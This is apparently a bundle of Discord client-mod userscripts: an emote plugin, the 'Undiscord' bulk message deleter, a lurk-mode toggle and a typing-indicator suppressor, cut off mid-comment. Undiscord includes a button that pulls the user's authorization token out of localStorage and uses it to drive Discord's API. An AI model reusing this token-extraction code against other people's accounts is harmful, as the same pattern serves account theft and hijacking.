p=e("jquery"),h=r(p),m=e("./emoteset"),v=r(m),g=e("./completion"),y=r(g),x=e("./reverse"),b=e("./mutationhelpers"),w=e("./emoteset/twitch"),T=e("./emoteset/smutbase"),_=e("./emoteset/partyparrot"),C=e("./emoteset/stock");h.default.fn.scrollBottom=function(e){var t=this[0];if(void 0===e){if(void 0===t)return;return t.scrollHeight-(this.scrollTop()+this.height())}return void 0===t?this:this.scrollTop(t.scrollHeight-(e+this.height()))},h.default.fn.textNodes=function(){return this.map(function(){var e=[],t=void 0,n=void 0;for(t=(0,h.default)(this).find("code").length>0?document.createTreeWalker(this,NodeFilter.SHOW_TEXT|NodeFilter.SHOW_ELEMENT,{acceptNode:function(e){return e.nodeType===Node.TEXT_NODE?NodeFilter.FILTER_ACCEPT:"code"===e.nodeName.toLowerCase()?NodeFilter.FILTER_REJECT:NodeFilter.FILTER_SKIP}}):document.createTreeWalker(this,NodeFilter.SHOW_TEXT);null!==(n=t.nextNode());)e.push(n);return e})},h.default.fn.parseEmotesStandard=function(e){return void 0===e||0===e.length?this:(this.textNodes().each(function(){var t=[],n=this.data.split(/(:[\w#*]+:)/g),r=[],o=!1,a=0,s=(0,h.default)(this).closest(".container-206Blv").not(".isSending-1nPcL7");0!==s.length&&(a=i(s[0]));for(var u=0;u<n.length&&(r.push(n[u]),void 0!==n[u+1]);u+=2){var l,c=!0,f=!1,d=void 0;try{for(var p,m=e[Symbol.iterator]();!(c=(p=m.next()).done);c=!0){var v=p.value;if(l=v.createEmote(/^:([^:]+):$/.exec(n[u+1])[1],a),void 0!==l)break}}catch(e){f=!0,d=e}finally{try{!c&&m.return&&m.return()}finally{if(f)throw d}}void 0!==l?(o=!0,t.push(document.createTextNode(r.join(""))),r=[],t.push(l)):r.push(n[u+1])}o&&(this.data=r.join("")),(0,h.default)(this).before(t)}),this)},h.default.fn.parseEmotesTwitch=function(e){return void 0===e||0===e.length?this:(this.textNodes().each(function(){for(var t=[],n=this.data.split(/(\W+)/g),r=[],o=!1,i=0;i<n.length;i+=2){var a,s=!0,u=!1,l=void 0;try{for(var c,f=e[Symbol.iterator]();!(s=(c=f.next()).done);s=!0){var d=c.value;if(a=d.createEmote(n[i]),void 0!==a)break}}catch(e){u=!0,l=e}finally{try{!s&&f.return&&f.return()}finally{if(u)throw l}}void 0!==a?(o=!0,t.push(document.createTextNode(r.join(""))),r=[],t.push(a)):r.push(n[i]),r.push(n[i+1])}o&&(this.data=r.join("")),(0,h.default)(this).before(t)}),this)},h.default.fn.parseEmotes=function(e){if(void 0===e||0===e.length)return this;var t=[],n=[],r=!0,o=!1,i=void 0;try{for(var a,s=e[Symbol.iterator]();!(r=(a=s.next()).done);r=!0){var u=a.value;u.emoteStyle===v.default.emoteStyle.STANDARD?t.push(u):u.emoteStyle===v.default.emoteStyle.TWITCH&&n.push(u)}}catch(e){o=!0,i=e}finally{try{!r&&s.return&&s.return()}finally{if(o)throw i}}return this.parseEmotesStandard(t).parseEmotesTwitch(n),this.not(".topic-TCb_qw.expandable-9fI_e3").has(".emoji").each(function(){var e=(0,h.default)(this).find(".edited-DL9ECl").text(),t=this.textContent.replace(e,"").trim();0===t.length?(0,h.default)(this).find(".emoji").addClass("jumboable"):(0,h.default)(this).find(".emoji").removeClass("jumboable")}),this},h.default.fn.fancyTooltip=function(){return this.filter("[title]").each(function(){var e=(0,h.default)(this).attr("title");(0,h.default)(this).addClass("kawaii-fancytooltip").removeAttr("title"),(0,h.default)(this).on("mouseover.fancyTooltip",function(){var t=(0,h.default)("<div>").append((0,h.default)("<div>").append((0,h.default)("<div>").addClass("tooltipPointer-3ZfirK")).append(e).addClass("tooltip-2QfLtc tooltipTop-XDDSxx tooltipBlack-PPG47z")).addClass("layer-v9HyYc");(0,h.default)(".layerContainer-yqaFcK").append(t);var n=t[0].getBoundingClientRect(),r=this.getBoundingClientRect(),o={top:r.top-n.height-8,left:r.left+r.width/2-n.width/2};t.offset(o),(0,h.default)(this).on("mouseout.fancyTooltip",function(){(0,h.default)(this).off("mouseout.fancyTooltip"),t.remove()})})})};var S=new MutationObserver(function(e,t){u(l(e),t)}),j=new MutationObserver(function(e,t){var n=l(e),r=n.addedNodes;r.length&&c()});d.prototype.load=function(){},d.prototype.unload=function(){};var E;d.prototype.start=function(){f(),window.setTimeout(function(){return y.default.start([T.smutbaseEmotes,_.partyParrotEmotes,w.twitchEmotes,w.twitchSubEmotes,C.discordEmoji])},1e3),a(S),j.observe(document.querySelector("#app-mount"),{childList:!0}),E=setInterval(f,72e5)},d.prototype.stop=function(){clearInterval(E),j.disconnect(),s(S),y.default.stop(),(0,h.default)(".kawaii-parseemotes").each(function(){var e=(0,h.default)(this);e.replaceWith(document.createTextNode(e.attr("alt")))})},d.prototype.getSettingsPanel=function(){return""}},{"./completion":54,"./emoteset":56,"./emoteset/partyparrot":57,"./emoteset/smutbase":58,"./emoteset/stock":59,"./emoteset/twitch":60,"./mutationhelpers":63,"./reverse":64,jquery:1}],63:[function(e,t,n){"use strict";function r(e){return e&&e.__esModule?e:{default:e}}function o(e,t){var n=(0,s.default)(e.target),r=(0,s.default)(e.addedNodes),o=n.add(r).filter(t),i=r.find(t),a=n.parents(t);return o.add(i).add(a)}function i(e,t){var n=(0,s.default)(e.removedNodes),r=n.filter(t),o=n.find(t);return r.add(o)}Object.defineProperty(n,"__esModule",{value:!0}),n.mutationFind=o,n.mutationFindRemoved=i;var a=e("jquery"),s=r(a)},{jquery:1}],64:[function(e,t,n){"use strict";function r(e){return e&&e.__esModule?e:{default:e}}function o(e){function t(e){return e.type.displayName||e.type||null}function n(e){var n=t(e);return null!==n&&!!(f.includes(n)^c)}var r=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{},o=r.include,i=r.exclude,u=void 0===i?["Popout","Tooltip","Scroller","BackgroundFlash"]:i;if(void 0!==e){for(var l,c=void 0===o,f=c?u:o,d=s(e);!(0,a.default)(d);l=d,d=d.return)if(n(d))return d;return null}}Object.defineProperty(n,"__esModule",{value:!0});var i=e("lodash/isNil"),a=r(i);n.getOwnerInstance=o;var s=function(e){return e[Object.keys(e).find(function(e){return e.startsWith("__reactInternalInstance")})]}},{"lodash/isNil":46}]},{},[62])(62)});var kawaiiDiscord=window.kawaiiDiscord=window.kawaiiDiscord.default;kawaiiDiscord.prototype.getName=function(){return"KawaiiDiscord"},kawaiiDiscord.prototype.getAuthor=function(){return"noodlebox"},kawaiiDiscord.prototype.getVersion=function(){return"0.12.3"},kawaiiDiscord.prototype.getDescription=function(){return"Add large sets of external emotes to Discord."};(function (plugin) { var p = new plugin(); p.load(); p.start(); })(kawaiiDiscord);
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Undiscord | Discord Deleter ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/**
 * Delete all messages in a Discord channel or DM
 * @param {string} authToken Your authorization token
 * @param {string} authorId Author of the messages you want to delete
 * @param {string} guildId Server were the messages are located
 * @param {string} channelId Channel were the messages are located
 * @param {string} minId Only delete messages after this, leave blank do delete all
 * @param {string} maxId Only delete messages before this, leave blank do delete all
 * @param {string} content Filter messages that contains this text content
 * @param {boolean} hasLink Filter messages that contains link
 * @param {boolean} hasFile Filter messages that contains file
 * @param {boolean} includeNsfw Search in NSFW channels
 * @param {function(string, Array)} extLogger Function for logging
 * @param {function} stopHndl stopHndl used for stopping
 * @author Victornpb <https://www.github.com/victornpb>
 * @see https://github.com/victornpb/deleteDiscordMessages
 */
async function deleteMessages(authToken, authorId, guildId, channelId, minId, maxId, content, hasLink, hasFile, includeNsfw, includePinned, searchDelay, deleteDelay, extLogger, stopHndl, onProgress) {
    const start = new Date();
    let delCount = 0;
    let failCount = 0;
    let avgPing;
    let lastPing;
    let grandTotal;
    let throttledCount = 0;
    let throttledTotalTime = 0;
    let offset = 0;
    let iterations = -1;

    const wait = async ms => new Promise(done => setTimeout(done, ms));
    const msToHMS = s => `${s / 3.6e6 | 0}h ${(s % 3.6e6) / 6e4 | 0}m ${(s % 6e4) / 1000 | 0}s`;
    const escapeHTML = html => html.replace(/[&<"']/g, m => ({ '&': '&amp;', '<': '&lt;', '"': '&quot;', '\'': '&#039;' })[m]);
    const redact = str => `<span class="priv">${escapeHTML(str)}</span><span class="mask">REDACTED</span>`;
    const queryString = params => params.filter(p => p[1] !== undefined).map(p => p[0] + '=' + encodeURIComponent(p[1])).join('&');
    const ask = async msg => new Promise(resolve => setTimeout(() => resolve(window.confirm(msg)), 10));
    const printDelayStats = () => log.verb(`Delete delay: ${deleteDelay}ms, Search delay: ${searchDelay}ms`, `Last Ping: ${lastPing}ms, Average Ping: ${avgPing | 0}ms`);
    const toSnowflake = (date) => /:/.test(date) ? ((new Date(date).getTime() - 1420070400000) * Math.pow(2, 22)) : date;

    const log = {
        debug() { extLogger ? extLogger('debug', arguments) : console.debug.apply(console, arguments); },
        info() { extLogger ? extLogger('info', arguments) : console.info.apply(console, arguments); },
        verb() { extLogger ? extLogger('verb', arguments) : console.log.apply(console, arguments); },
        warn() { extLogger ? extLogger('warn', arguments) : console.warn.apply(console, arguments); },
        error() { extLogger ? extLogger('error', arguments) : console.error.apply(console, arguments); },
        success() { extLogger ? extLogger('success', arguments) : console.info.apply(console, arguments); },
    };

    async function recurse() {
        let API_SEARCH_URL;
        if (guildId === '@me') {
            API_SEARCH_URL = `https://discord.com/api/v6/channels/${channelId}/messages/`; // DMs
        }
        else {
            API_SEARCH_URL = `https://discord.com/api/v6/guilds/${guildId}/messages/`; // Server
        }

        const headers = {
            'Authorization': authToken
        };

        let resp;
        try {
            const s = Date.now();
            resp = await fetch(API_SEARCH_URL + 'search?' + queryString([
                ['author_id', authorId || undefined],
                ['channel_id', (guildId !== '@me' ? channelId : undefined) || undefined],
                ['min_id', minId ? toSnowflake(minId) : undefined],
                ['max_id', maxId ? toSnowflake(maxId) : undefined],
                ['sort_by', 'timestamp'],
                ['sort_order', 'desc'],
                ['offset', offset],
                ['has', hasLink ? 'link' : undefined],
                ['has', hasFile ? 'file' : undefined],
                ['content', content || undefined],
                ['include_nsfw', includeNsfw ? true : undefined],
            ]), { headers });
            lastPing = (Date.now() - s);
            avgPing = avgPing > 0 ? (avgPing * 0.9) + (lastPing * 0.1) : lastPing;
        } catch (err) {
            return log.error('Search request threw an error:', err);
        }

        // not indexed yet
        if (resp.status === 202) {
            const w = (await resp.json()).retry_after;
            throttledCount++;
            throttledTotalTime += w;
            log.warn(`This channel wasn't indexed, waiting ${w}ms for discord to index it...`);
            await wait(w);
            return await recurse();
        }

        if (!resp.ok) {
            // searching messages too fast
            if (resp.status === 429) {
                const w = (await resp.json()).retry_after;
                throttledCount++;
                throttledTotalTime += w;
                searchDelay += w; // increase delay
                log.warn(`Being rate limited by the API for ${w}ms! Increasing search delay...`);
                printDelayStats();
                log.verb(`Cooling down for ${w * 2}ms before retrying...`);

                await wait(w * 2);
                return await recurse();
            } else {
                return log.error(`Error searching messages, API responded with status ${resp.status}!\n`, await resp.json());
            }
        }

        const data = await resp.json();
        const total = data.total_results;
        if (!grandTotal) grandTotal = total;
        const discoveredMessages = data.messages.map(convo => convo.find(message => message.hit === true));
        const messagesToDelete = discoveredMessages.filter(msg => {
            return msg.type === 0 || msg.type === 6 || (msg.pinned && includePinned);
        });
        const skippedMessages = discoveredMessages.filter(msg => !messagesToDelete.find(m => m.id === msg.id));

        const end = () => {
            log.success(`Ended at ${new Date().toLocaleString()}! Total time: ${msToHMS(Date.now() - start.getTime())}`);
            printDelayStats();
            log.verb(`Rate Limited: ${throttledCount} times. Total time throttled: ${msToHMS(throttledTotalTime)}.`);
            log.debug(`Deleted ${delCount} messages, ${failCount} failed.\n`);
        }

        const etr = msToHMS((searchDelay * Math.round(total / 25)) + ((deleteDelay + avgPing) * total));
        log.info(`Total messages found: ${data.total_results}`, `(Messages in current page: ${data.messages.length}, To be deleted: ${messagesToDelete.length}, System: ${skippedMessages.length})`, `offset: ${offset}`);
        printDelayStats();
        log.verb(`Estimated time remaining: ${etr}`)


        if (messagesToDelete.length > 0) {

            if (++iterations < 1) {
                log.verb(`Waiting for your confirmation...`);
                if (!await ask(`Do you want to delete ~${total} messages?\nEstimated time: ${etr}\n\n---- Preview ----\n` +
                    messagesToDelete.map(m => `${m.author.username}#${m.author.discriminator}: ${m.attachments.length ? '[ATTACHMENTS]' : m.content}`).join('\n')))
                    return end(log.error('Aborted by you!'));
                log.verb(`OK`);
            }

            for (let i = 0; i < messagesToDelete.length; i++) {
                const message = messagesToDelete[i];
                if (stopHndl && stopHndl() === false) return end(log.error('Stopped by you!'));

                log.debug(`${((delCount + 1) / grandTotal * 100).toFixed(2)}% (${delCount + 1}/${grandTotal})`,
                                                                               `Deleting ID:${redact(message.id)} <b>${redact(message.author.username + '#' + message.author.discriminator)} <small>(${redact(new Date(message.timestamp).toLocaleString())})</small>:</b> <i>${redact(message.content).replace(/\n/g, '↵')}</i>`,
message.attachments.length ? redact(JSON.stringify(message.attachments)) : '');
if (onProgress) onProgress(delCount + 1, grandTotal);

let resp;
try {
    const s = Date.now();
    const API_DELETE_URL = `https://discord.com/api/v6/channels/${message.channel_id}/messages/${message.id}`;
    resp = await fetch(API_DELETE_URL, {
        headers,
        method: 'DELETE'
    });
    lastPing = (Date.now() - s);
    avgPing = (avgPing * 0.9) + (lastPing * 0.1);
    delCount++;
} catch (err) {
    log.error('Delete request throwed an error:', err);
    log.verb('Related object:', redact(JSON.stringify(message)));
    failCount++;
}

if (!resp.ok) {
    // deleting messages too fast
    if (resp.status === 429) {
        const w = (await resp.json()).retry_after;
        throttledCount++;
        throttledTotalTime += w;
        deleteDelay = w; // increase delay
        log.warn(`Being rate limited by the API for ${w}ms! Adjusted delete delay to ${deleteDelay}ms.`);
        printDelayStats();
        log.verb(`Cooling down for ${w * 2}ms before retrying...`);
        await wait(w * 2);
        i--; // retry
    } else {
        log.error(`Error deleting message, API responded with status ${resp.status}!`, await resp.json());
        log.verb('Related object:', redact(JSON.stringify(message)));
        failCount++;
    }
}

await wait(deleteDelay);
}

if (skippedMessages.length > 0) {
    grandTotal -= skippedMessages.length;
    offset += skippedMessages.length;
    log.verb(`Found ${skippedMessages.length} system messages! Decreasing grandTotal to ${grandTotal} and increasing offset to ${offset}.`);
}

log.verb(`Searching next messages in ${searchDelay}ms...`, (offset ? `(offset: ${offset})` : ''));
await wait(searchDelay);

if (stopHndl && stopHndl() === false) return end(log.error('Stopped by you!'));

return await recurse();
} else {
    if (total - offset > 0) log.warn('Ended because API returned an empty page.');
    return end();
}
}

log.success(`\nStarted at ${start.toLocaleString()}`);
log.debug(`authorId="${redact(authorId)}" guildId="${redact(guildId)}" channelId="${redact(channelId)}" minId="${redact(minId)}" maxId="${redact(maxId)}" hasLink=${!!hasLink} hasFile=${!!hasFile}`);
if (onProgress) onProgress(null, 1);
return await recurse();
}

//---- User interface ----//

let popover;
let btn;
let stop;

function initUI() {

    const insertCss = (css) => {
        const style = document.createElement('style');
        style.appendChild(document.createTextNode(css));
        document.head.appendChild(style);
        return style;
    }

    const createElm = (html) => {
        const temp = document.createElement('div');
        temp.innerHTML = html;
        return temp.removeChild(temp.firstElementChild);
    }

    insertCss(`
        #undicord-btn{position: relative; height: 24px;width: auto;-webkit-box-flex: 0;-ms-flex: 0 0 auto;flex: 0 0 auto;margin: 0 8px;cursor:pointer; color: var(--interactive-normal);}
        #undiscord{position:fixed;top:100px;right:10px;bottom:10px;width:780px;z-index:99;color:var(--text-normal);background-color:var(--background-secondary);box-shadow:var(--elevation-stroke),var(--elevation-high);border-radius:4px;display:flex;flex-direction:column}
        #undiscord a{color:#00b0f4}
        #undiscord.redact .priv{display:none!important}
        #undiscord:not(.redact) .mask{display:none!important}
        #undiscord.redact [priv]{-webkit-text-security:disc!important}
        #undiscord .toolbar span{margin-right:8px}
        #undiscord button,#undiscord .btn{color:#fff;background:#7289da;border:0;border-radius:4px;font-size:14px}
        #undiscord button:disabled{display:none}
        #undiscord input[type="text"],#undiscord input[type="search"],#undiscord input[type="password"],#undiscord input[type="datetime-local"],#undiscord input[type="number"]{background-color:#202225;color:#b9bbbe;border-radius:4px;border:0;padding:0 .5em;height:24px;width:144px;margin:2px}
        #undiscord input#file{display:none}
        #undiscord hr{border-color:rgba(255,255,255,0.1)}
        #undiscord .header{padding:12px 16px;background-color:var(--background-tertiary);color:var(--text-muted)}
        #undiscord .form{padding:8px;background:var(--background-secondary);box-shadow:0 1px 0 rgba(0,0,0,.2),0 1.5px 0 rgba(0,0,0,.05),0 2px 0 rgba(0,0,0,.05)}
        #undiscord .logarea{overflow:auto;font-size:.75rem;font-family:Consolas,Liberation Mono,Menlo,Courier,monospace;flex-grow:1;padding:10px}
    `);

    popover = createElm(`
    <div id="undiscord" style="display:none;">
        <div class="header">
            Undiscord - Bulk delete messages
        </div>
        <div class="form">
            <div style="display:flex;flex-wrap:wrap;">
                <span>Authorization <a
                        href="https://github.com/victornpb/deleteDiscordMessages/blob/master/help/authToken.md" title="Help"
                        target="_blank">?</a> <button id="getToken">get</button><br>
                    <input type="password" id="authToken" placeholder="Auth Token" autofocus>*<br>
                    <span>Author <a href="https://github.com/victornpb/deleteDiscordMessages/blob/master/help/authorId.md"
                            title="Help" target="_blank">?</a> <button id="getAuthor">get</button></span>
                    <br><input id="authorId" type="text" placeholder="Author ID" priv></span>
                <span>Guild/Channel <a
                        href="https://github.com/victornpb/deleteDiscordMessages/blob/master/help/channelId.md" title="Help"
                        target="_blank">?</a>
                    <button id="getGuildAndChannel">get</button><br>
                    <input id="guildId" type="text" placeholder="Guild ID" priv><br>
                    <input id="channelId" type="text" placeholder="Channel ID" priv><br>
                    <label><input id="includeNsfw" type="checkbox">NSFW Channel</label><br><br>
                    <label for="file" title="Import list of channels from messages/index.json file"> Import: <span
                            class="btn">...</span> <input id="file" type="file" accept="application/json,.json"></label>
                </span><br>
                <span>Range <a href="https://github.com/victornpb/deleteDiscordMessages/blob/master/help/messageId.md"
                        title="Help" target="_blank">?</a><br>
                    <input id="minDate" type="datetime-local" title="After" style="width:auto;"><br>
                    <input id="maxDate" type="datetime-local" title="Before" style="width:auto;"><br>
                    <input id="minId" type="text" placeholder="After message with Id" priv><br>
                    <input id="maxId" type="text" placeholder="Before message with Id" priv><br>
                </span>
                <span>Search messages <a
                        href="https://github.com/victornpb/deleteDiscordMessages/blob/master/help/filters.md" title="Help"
                        target="_blank">?</a><br>
                    <input id="content" type="text" placeholder="Containing text" priv><br>
                    <label><input id="hasLink" type="checkbox">has: link</label><br>
                    <label><input id="hasFile" type="checkbox">has: file</label><br>
                    <label><input id="includePinned" type="checkbox">Include pinned</label>
                </span><br>
                <span>Search Delay <a
                href="https://github.com/victornpb/deleteDiscordMessages/blob/master/help/delay.md" title="Help"
                target="_blank">?</a><br>
                    <input id="searchDelay" type="number" value="100" step="100"><br>
                </span>
                <span>Delete Delay <a
                href="https://github.com/victornpb/deleteDiscordMessages/blob/master/help/delay.md" title="Help"
                target="_blank">?</a><br>
                    <input id="deleteDelay" type="number" value="1000" step="100">
                </span>
            </div>
            <hr>
            <button id="start" style="background:#43b581;width:80px;">Start</button>
            <button id="stop" style="background:#f04747;width:80px;" disabled>Stop</button>
            <button id="clear" style="width:80px;">Clear log</button>
            <label><input id="autoScroll" type="checkbox" checked>Auto scroll</label>
            <label title="Hide sensitive information for taking screenshots"><input id="redact" type="checkbox">Screenshot
                mode</label>
            <progress id="progress" style="display:none;"></progress> <span class="percent"></span>
        </div>
        <pre class="logarea">
            <center>Star this project on <a href="https://github.com/victornpb/deleteDiscordMessages" target="_blank">github.com/victornpb/deleteDiscordMessages</a>!\n\n
                <a href="https://github.com/victornpb/deleteDiscordMessages/issues" target="_blank">Issues or help</a>
            </center>
        </pre>
    </div>
    `);

    document.body.appendChild(popover);

    btn = createElm(`<div id="undicord-btn" tabindex="0" role="button" aria-label="Delete Messages" title="Delete Messages">
    <svg aria-hidden="false" width="24" height="24" viewBox="0 0 24 24">
        <path fill="currentColor" d="M15 3.999V2H9V3.999H3V5.999H21V3.999H15Z"></path>
        <path fill="currentColor" d="M5 6.99902V18.999C5 20.101 5.897 20.999 7 20.999H17C18.103 20.999 19 20.101 19 18.999V6.99902H5ZM11 17H9V11H11V17ZM15 17H13V11H15V17Z"></path>
    </svg>
    <br><progress style="display:none; width:24px;"></progress>
</div>`);

    btn.onclick = function togglePopover() {
        if (popover.style.display !== 'none') {
            popover.style.display = 'none';
            btn.style.color = 'var(--interactive-normal)';
        }
        else {
            popover.style.display = '';
            btn.style.color = '#f04747';
        }
    };

    function mountBtn() {
        const toolbar = document.querySelector('[class^=toolbar]');
        if (toolbar) toolbar.appendChild(btn);
    }

    const observer = new MutationObserver(function (_mutationsList, _observer) {
        if (!document.body.contains(btn)) mountBtn(); // re-mount the button to the toolbar
    });
    observer.observe(document.body, { attributes: false, childList: true, subtree: true });

    mountBtn();

    const $ = s => popover.querySelector(s);
    const logArea = $('pre');
    const startBtn = $('button#start');
    const stopBtn = $('button#stop');
    const autoScroll = $('#autoScroll');

    startBtn.onclick = async e => {
        const authToken = $('input#authToken').value.trim();
        const authorId = $('input#authorId').value.trim();
        const guildId = $('input#guildId').value.trim();
        const channelIds = $('input#channelId').value.trim().split(/\s*,\s*/);
        const minId = $('input#minId').value.trim();
        const maxId = $('input#maxId').value.trim();
        const minDate = $('input#minDate').value.trim();
        const maxDate = $('input#maxDate').value.trim();
        const content = $('input#content').value.trim();
        const hasLink = $('input#hasLink').checked;
        const hasFile = $('input#hasFile').checked;
        const includeNsfw = $('input#includeNsfw').checked;
        const includePinned = $('input#includePinned').checked;
        const searchDelay = parseInt($('input#searchDelay').value.trim());
        const deleteDelay = parseInt($('input#deleteDelay').value.trim());
        const progress = $('#progress');
        const progress2 = btn.querySelector('progress');
        const percent = $('.percent');

        const fileSelection = $("input#file");
        fileSelection.addEventListener("change", () => {
            const files = fileSelection.files;
            const channelIdField = $('input#channelId');
            if (files.length > 0) {
                const file = files[0];
                file.text().then(text => {
                    let json = JSON.parse(text);
                    let channels = Object.keys(json);
                    channelIdField.value = channels.join(",");
                });
            }
        }, false);

        const stopHndl = () => !(stop === true);

        const onProg = (value, max) => {
            if (value && max && value > max) max = value;
            progress.setAttribute('max', max);
            progress.value = value;
            progress.style.display = max ? '' : 'none';
            progress2.setAttribute('max', max);
            progress2.value = value;
            progress2.style.display = max ? '' : 'none';
            percent.innerHTML = value && max ? Math.round(value / max * 100) + '%' : '';
        };


        stop = stopBtn.disabled = !(startBtn.disabled = true);
        for (let i = 0; i < channelIds.length; i++) {
            await deleteMessages(authToken, authorId, guildId, channelIds[i], minId || minDate, maxId || maxDate, content, hasLink, hasFile, includeNsfw, includePinned, searchDelay, deleteDelay, logger, stopHndl, onProg);
            stop = stopBtn.disabled = !(startBtn.disabled = false);
        }
    };
    stopBtn.onclick = e => stop = stopBtn.disabled = !(startBtn.disabled = false);
    $('button#clear').onclick = e => { logArea.innerHTML = ''; };
    $('button#getToken').onclick = e => {
        window.dispatchEvent(new Event('beforeunload'));
        const ls = document.body.appendChild(document.createElement('iframe')).contentWindow.localStorage;
        $('input#authToken').value = JSON.parse(localStorage.token);
    };
    $('button#getAuthor').onclick = e => {
        $('input#authorId').value = JSON.parse(localStorage.user_id_cache);
    };
    $('button#getGuildAndChannel').onclick = e => {
        const m = location.href.match(/channels\/([\w@]+)\/(\d+)/);
        $('input#guildId').value = m[1];
        $('input#channelId').value = m[2];
    };
    $('#redact').onchange = e => {
        popover.classList.toggle('redact') &&
            window.alert('This will attempt to hide personal information, but make sure to double check before sharing screenshots.');
    };

    const logger = (type = '', args) => {
        const style = { '': '', info: 'color:#00b0f4;', verb: 'color:#72767d;', warn: 'color:#faa61a;', error: 'color:#f04747;', success: 'color:#43b581;' }[type];
        logArea.insertAdjacentHTML('beforeend', `<div style="${style}">${Array.from(args).map(o => typeof o === 'object' ? JSON.stringify(o, o instanceof Error && Object.getOwnPropertyNames(o)) : o).join('\t')}</div>`);
        if (autoScroll.checked) logArea.querySelector('div:last-child').scrollIntoView(false);
    };

    // fixLocalStorage
    window.localStorage = document.body.appendChild(document.createElement('iframe')).contentWindow.localStorage;

}

initUI();
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Lurk-Mode Switch |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
function createBox() {
    if (document.getElementsByTagName('textarea')[0] || document.querySelector(".markup-2BOw-j.slateTextArea-1Mkdgw")){
        var frag = document.createDocumentFragment();
        var outDiv = document.createElement("DIV");
        outDiv.className = "lurkDiv";
        var outLabel = document.createElement("LABEL");
        outLabel.className = "lurkSwitch";
        var outSpan = document.createElement("SPAN");
        outSpan.className = "lurkSlider round";
        var checkBox = document.createElement("input");
        checkBox.type = "checkbox";
        checkBox.id = "checker";
        var style = document.createElement("style");
        var sheet = document.head.appendChild(style).sheet;
        sheet.insertRule('.lurkSwitch {position: relative; display: inline-block; width: 25px; height: 15px;}',sheet.cssRules.length);
        sheet.insertRule('.lurkSwitch input {display:none;}',sheet.cssRules.length);
        sheet.insertRule('.lurkSlider {position: absolute;cursor: pointer;top: 0;left: 0;right: 0;bottom: 0;background-color: var(--Color005);-webkit-transition: .2s;transition: .2s;}',sheet.cssRules.length);
        sheet.insertRule('.lurkSlider:before {position: absolute;content: "";height: 15px; width: 15px;left: 0px;bottom: 0px;background-color: #262A2D;-webkit-transition: .2s;transition: .2s;}',sheet.cssRules.length);
        sheet.insertRule('input:checked + .lurkSlider {background-color: white;}',sheet.cssRules.length);
        sheet.insertRule('input:focus + .lurkSlider.round {box-shadow: 0px 0px 0px 3px white;}',sheet.cssRules.length);
        sheet.insertRule('input:checked + .lurkSlider.round {box-shadow: 0px 0px 0px 3px white;}',sheet.cssRules.length);
        sheet.insertRule('input:checked + .lurkSlider:before {background-color: var(--Color005); -webkit-transform: translateX(10px);-ms-transform: translateX(10px);transform: translateX(10px);}',sheet.cssRules.length);
        sheet.insertRule('.lurkSlider.round {box-shadow: 0px 0px 0px 3px var(--Color005); border-radius: 100px;}',sheet.cssRules.length);
        sheet.insertRule('.lurkSlider.round:before {border-radius: 100%;}',sheet.cssRules.length);
        sheet.insertRule('.lurkDiv {z-index: 99; position: absolute; left: 342px; top: 500px;}',sheet.cssRules.length);
        frag.appendChild(outDiv);
        outDiv.appendChild(outLabel);
        outLabel.appendChild(checkBox);
        outLabel.appendChild(outSpan);
        var appFront = document.getElementById('app-mount');
        appFront.parentNode.insertBefore(frag, appFront.nextSibling);
    } else {
        setTimeout(createBox,1000);
    }
}

function recheck(){
    var messageBox = document.querySelector(".markup-2BOw-j.slateTextArea-1Mkdgw");
    var preMessageBox = document.getElementsByTagName('textarea')[0];
    if (messageBox) {
        if (document.getElementById('checker').checked === true) {
            messageBox.setAttribute('contentEditable', false);
            messageBox.setAttribute("style", "outline: none; white-space: pre-wrap; overflow-wrap: break-word;");
        } else {
            messageBox.setAttribute('contentEditable', true);
            messageBox.setAttribute("style", "outline: none; white-space: pre-wrap; overflow-wrap: break-word; -webkit-user-modify: none;");
        }
    }
    if (preMessageBox) {
        if (document.getElementById('checker').checked === true) {
            preMessageBox.setAttribute('disabled', true);
        } else {
            preMessageBox.removeAttribute('disabled');
        }
    }
}

window.addEventListener("load", createBox, false);
window.addEventListener("click", recheck, false);

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Silent Typing ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
(function () {
    "use strict";

    let cancel = null;

    const start = function () {
        const module = WebpackModules.findByUniqueProperties(["startTyping"]);
        if (!module) {
            console.error("SilentTyping:", "unable to monkey patch sendTyping method");
            return;
        }
        cancel = monkeyPatch(module, "startTyping", {instead: ()=>{}});
    };

    const stop = function () {
        if (cancel) {
            cancel();
            cancel = null;
        }
    };

    /**
     * Function with no arguments and no return value that may be called to reverse changes that is done by {@link monkeyPatch} method, restoring (unpatching) original method.
     * @callback cancelPatch
     */

    /**
     * This is a shortcut for calling original method using this and arguments from data object. This is a function without input arguments. This function is defined as `() => data.returnValue = data.originalMethod.apply(data.thisObject, data.methodArguments)`
     * @callback originalMethodCall
     * @return {*} The same value, which is returned from original method, also this value would be written into `data.returnValue`
     */

    /**
     * A callback that modifies method logic. Callback is called on each call of original method and have all data about original call. Any of the data can be modified if you need, but do it wisely.
     * @callback doPatchCallback
     * @param {PatchData} data Data object with all information about current that you may need in your patching callback.callback.
     * @return {*} Makes sense only when used as `instead` parameter in {@link monkeyPatch}. If returned something other then undefined - it replaces value in `returnValue` param. If used as `before` or `after` parameters - return value if ignored.
     */

    /**
     * This is function for monkey-patching any object method. Can make patch before, after or instead of target method.
     * Be careful when monkey-patching. Think not only about original functionality of target method and you changes, but also about develovers of other plugins, who may also patch this method before or after you. Try to change target method behaviour little as you can, and try to never change method signatures.
     * By default this function makes log messages about each patching and unpatching, so you and other developers can see what methods a patched. This messages may be suppressed.
     * Display name of patched method is changed, so you can see if function is patched and how many times while debuging or in the stack trace. Also patched function have property `__monkeyPatched` is set to true, in case you want to check something programmatically.
     *
     * @author samogot
